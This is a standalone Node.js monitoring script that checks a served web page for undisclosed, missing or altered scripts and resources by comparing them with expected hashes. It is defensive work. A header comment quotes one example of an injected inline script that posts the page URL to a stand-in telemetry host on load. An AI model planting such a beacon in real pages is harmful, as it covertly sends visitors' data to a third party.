#!/usr/bin/env node
/**
 * served-page-audit — what a page actually carries, as a browser receives it.
 *
 * STANDALONE. No repository, no checkout, no npm install, no dependencies. One file and
 * a Node with global fetch (18+). Copy it to wherever the schedule runs.
 *
 *   node served-page-audit.mjs
 *   node served-page-audit.mjs https://observerprotocol.org/check
 *   node served-page-audit.mjs https://observerprotocol.org/check --disclose=cloudflareinsights
 *   node served-page-audit.mjs --version
 *
 * THIS FILE IS NOT SERVED, AND THAT IS A RULING RATHER THAN AN OVERSIGHT.
 * `netlify.toml` 404s `/scripts/*`. The scheduler holds its own copy and does not fetch
 * it from the zone under test, because a monitor that downloads itself from the thing it
 * is monitoring cannot report that the thing is compromised.
 *
 * SO THE COPIES CAN DRIFT, AND THE HEADER BELOW IS HOW YOU FIND OUT.
 * `--version` prints the recorded version, the hash recorded in this file, and the hash
 * computed from the file on disk. Compare the COMPUTED hash against the repository's
 * recorded one. Three outcomes, all distinguishable:
 *
 *   recorded == computed, and matches the repo   this copy is the repo copy
 *   recorded != computed                         this copy was edited, header not updated
 *   both agree but differ from the repo          this copy is a different version
 *
 * WHAT THIS ADJUDICATES, AND THE LIMIT THAT COMES WITH IT
 * ------------------------------------------------------
 * It reads MARKUP. It does not execute anything.
 *
 * So it establishes what was DELIVERED, not what is PERFORMED. It sees a script that is
 * present, whether external or inline, and it cannot see what any of them does once it
 * runs. A runtime request made by a script that is already disclosed is out of its reach:
 * disclose a tag manager and it will not tell you which third parties that tag manager
 * then loads. That limit is stated on the page this watches, in the register, and here,
 * because a control's scope silently defining the defect is how the previous version of
 * this file was wrong.
 *
 * MEASURED 2026-08-17, and it is why inline is adjudicated at all: version 1.0.0 of this
 * file matched only `src=`, `href=`, `@import` and `url(`. An inline script injected into
 * the page, with no src, issuing `fetch('https://telemetry.example.com/collect', {method:
 * 'POST', body: location.href})` on load, scored exit 0 and printed "loads (nothing)".
 * The check was exactly accurate about the comparison it made and its accuracy is what
 * stopped anyone asking about the one it did not.
 *
 * WHY THE HEADERS
 * ---------------
 * Measured 2026-08-17 on observerprotocol.org: Cloudflare injects its Web Analytics
 * beacon into HTML responses ONLY when the request carries browser headers. A plain
 * `curl` of the same URL comes back with no beacon at all. Fetching the thing is not
 * enough; it has to be fetched as the reader.
 *
 * SYMMETRIC IN BOTH DIRECTIONS, TWICE OVER
 * ----------------------------------------
 * EXPECTED is the page's own script set, asserted positively. DISCLOSED is what the page
 * tells a visitor it carries in addition. The run fails when:
 *
 *   something is present that is neither expected nor disclosed   an injection
 *   something disclosed is no longer present                      a stale disclosure
 *   something expected is missing or altered                      the page's own code changed
 *
 * The third is the direction a subtraction hides in. An injected script is loud; the
 * page's own verifier being removed, or rewritten by a script-rewriting optimiser, leaves
 * a page that looks fine and checks nothing.
 *
 * EXIT CODES, because this is meant to be scheduled
 *   0  what the page carries is exactly what is expected and disclosed
 *   1  mismatch, in any of the three directions
 *   2  could not reach the page. NOT a pass. A check that cannot reach its subject must
 *      say it did not look, and a scheduler must tell that apart from a clean result.
 */

import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';

const AUDIT_VERSION = '2.0.0';
// sha256 of this file with the literal on the line below normalised to an empty string.
// Recompute with --version. Update it in the same commit as any edit to this file.
const AUDIT_SHA256 = '2503d04de15ebb6b15fd0273602442bd385cf1c1643d71a2d922f9ebd3b515e2';

const sha256 = (s) => createHash('sha256').update(s).digest('hex');

function computeSelfHash() {
  const src = readFileSync(fileURLToPath(import.meta.url), 'utf8');
  return sha256(src.replace(/const AUDIT_SHA256 = '[a-f0-9]*';/, "const AUDIT_SHA256 = '';"));
}

// ─── the page's own scripts, asserted positively ──────────────────────────────────
//
// Hash of the script body exactly as served. Update alongside check.html; the repository
// keeps these honest with scripts/check-audit-expectations.mjs, which recomputes them
// from the file and fails the build when they drift.
const EXPECTED = [
  {
    label: 'the embedded published example',
    sha256: 'a2524ac4c965bfb3388a9bc05a636e51b321063ef65b98ed567e73145758ca24',
    why: 'The worked example, carried in the page so that loading it costs no request. Its absence would send the example over the network; its alteration would show a visitor an artifact that is not the published one.',
  },
  {
    label: 'the page verifier',
    sha256: '15ea72c9bb8f60412d3c8527d0c39091e33b5ca1ece5b2474dbf5fefdd2ffe85',
    why: 'The code that reaches the verdict. If this is missing the page renders and decides nothing; if it is altered, it decides something else.',
  },
];

const args = process.argv.slice(2);

if (args.includes('--version') || args.includes('-v')) {
  const computed = computeSelfHash();
  const agree = computed === AUDIT_SHA256;
  console.log(`version   ${AUDIT_VERSION}`);
  console.log(`recorded  ${AUDIT_SHA256}`);
  console.log(`computed  ${computed}`);
  console.log('');
  console.log(
    agree
      ? 'This copy matches its own header. Compare the computed hash against the repository copy.'
      : 'MISMATCH. This copy was edited and its header was not updated, so it is not the file it says it is.'
  );
  process.exit(agree ? 0 : 1);
}

const url = args.find((a) => !a.startsWith('-')) ?? 'https://observerprotocol.org/check';
const disclosed = args
  .filter((a) => a.startsWith('--disclose='))
  .flatMap((a) => a.slice('--disclose='.length).split(','))
  .map((s) => s.trim())
  .filter(Boolean);

const BROWSER_HEADERS = {
  'User-Agent':
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
  Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
};

let body, headers;
try {
  const res = await fetch(url, { headers: BROWSER_HEADERS, redirect: 'follow' });
  headers = res.headers;
  if (!res.ok) {
    console.log(`NOT CHECKED  ${url} returned HTTP ${res.status}.`);
    console.log('             Reported rather than passed. This is not a clean result.');
    process.exit(2);
  }
  body = await res.text();
} catch (e) {
  console.log(`NOT CHECKED  ${url} could not be fetched: ${e.message}`);
  console.log('             Reported rather than passed. This is not a clean result.');
  process.exit(2);
}

// ─── every script element, external or not ────────────────────────────────────────
const scripts = [];
for (const m of body.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/gi)) {
  const attrs = m[1] ?? '';
  const src = attrs.match(/\bsrc\s*=\s*["']?([^"'\s>]+)/i);
  scripts.push(src ? { kind: 'script', ref: src[1] } : { kind: 'inline', body: m[2], hash: sha256(m[2]) });
}

// ─── every other resource the markup pulls ────────────────────────────────────────
//
// Scanned with the page's own JSON islands removed: a URL inside data a page DISPLAYS is
// text a reader can see, not a resource a browser goes and gets. The islands are still
// inventoried above as scripts, so removing one is still caught.
const withoutIslands = body.replace(/<script[^>]*type=["']application\/json["'][\s\S]*?<\/script>/gi, '');
const OTHER_LOADS = [
  [/<link[^>]*\bhref\s*=\s*["']?([^"'\s>]+)/gi, 'link'],
  [/<iframe[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)/gi, 'iframe'],
  [/<img[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)/gi, 'image'],
  [/<embed[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)/gi, 'embed'],
  [/<object[^>]*\bdata\s*=\s*["']?([^"'\s>]+)/gi, 'object'],
  [/@import\s+["']?([^"'\s;]+)/gi, 'css-import'],
  [/url\(\s*["']?(https?:\/\/[^"')\s]+)/gi, 'css-url'],
];
for (const [re, kind] of OTHER_LOADS) {
  for (const m of withoutIslands.matchAll(re)) {
    if (m[1] && !scripts.some((s) => s.ref === m[1])) scripts.push({ kind, ref: m[1] });
  }
}

// ─── adjudication ─────────────────────────────────────────────────────────────────
const expectedByHash = new Map(EXPECTED.map((e) => [e.sha256, e]));
const isDisclosed = (item) =>
  disclosed.some((d) =>
    item.ref !== undefined ? item.ref.includes(d) : item.body.includes(d) || item.hash.startsWith(d)
  );

const rows = [];
const problems = { undisclosed: [], missingDisclosure: [], missingExpected: [] };

for (const item of scripts) {
  if (item.kind === 'inline') {
    const expected = expectedByHash.get(item.hash);
    if (expected) { rows.push(['ok', 'own', `${expected.label}  ${item.hash.slice(0, 16)}`]); continue; }
    if (isDisclosed(item)) { rows.push(['ok', 'inline', `disclosed  ${item.hash.slice(0, 16)}`]); continue; }
    rows.push(['FAIL', 'inline', `${item.hash.slice(0, 16)}  ${item.body.trim().replace(/\s+/g, ' ').slice(0, 90)}`]);
    problems.undisclosed.push(`an inline script, sha256 ${item.hash}`);
    continue;
  }
  if (isDisclosed(item)) { rows.push(['ok', item.kind, item.ref]); continue; }
  rows.push(['FAIL', item.kind, item.ref]);
  problems.undisclosed.push(`${item.kind} ${item.ref}`);
}

for (const e of EXPECTED) {
  if (!scripts.some((s) => s.hash === e.sha256)) {
    rows.push(['FAIL', 'missing', `${e.label}  expected sha256 ${e.sha256.slice(0, 16)}`]);
    problems.missingExpected.push(e);
  }
}

for (const d of disclosed) {
  const stillThere = scripts.some((s) => (s.ref !== undefined ? s.ref.includes(d) : s.body.includes(d) || s.hash.startsWith(d)));
  if (!stillThere) {
    rows.push(['FAIL', 'stale', `${d}  is disclosed and no longer present`]);
    problems.missingDisclosure.push(d);
  }
}

// ─── report ───────────────────────────────────────────────────────────────────────
console.log(`url          ${url}`);
console.log(`audit        ${AUDIT_VERSION}  ${AUDIT_SHA256.slice(0, 16)}`);
console.log(`server       ${headers.get('server') ?? '(none)'}`);
console.log(`cf-ray       ${headers.get('cf-ray') ?? '(none)'}`);
console.log(`disclosed    ${disclosed.length ? disclosed.join(', ') : '(nothing beyond the page itself)'}`);
console.log('');
for (const [status, kind, detail] of rows) console.log(`${status.padEnd(8)} ${kind.padEnd(10)} ${detail}`);
if (!rows.length) console.log('(the page carries no scripts and no other resources at all)');

const failed = problems.undisclosed.length + problems.missingDisclosure.length + problems.missingExpected.length;
if (failed) {
  console.log('');
  if (problems.undisclosed.length) {
    console.log('This page carries something neither expected nor disclosed.');
    console.log('  Either it goes, or the page discloses it AND it is added to --disclose, together.');
  }
  if (problems.missingExpected.length) {
    console.log("This page is missing one of its own scripts, or one of them has been altered.");
    for (const e of problems.missingExpected) console.log(`  ${e.label}: ${e.why}`);
    console.log('  A subtraction is quieter than an injection and this is the direction it hides in.');
  }
  if (problems.missingDisclosure.length) {
    console.log('This page discloses something it no longer carries.');
    console.log('  The good direction, and still a failure: the page now describes something that');
    console.log('  is not there. Remove the disclosure and the --disclose entry together.');
  }
  console.log('');
  console.log('Read this as what was DELIVERED. Nothing here was executed, so a runtime request');
  console.log('made by a script listed above is outside what this establishes.');
  process.exit(1);
}

console.log('');
console.log('What a visitor receives is exactly the page, plus exactly what is disclosed.');
console.log('Markup only: nothing was executed, so this is what was delivered, not what is performed.');
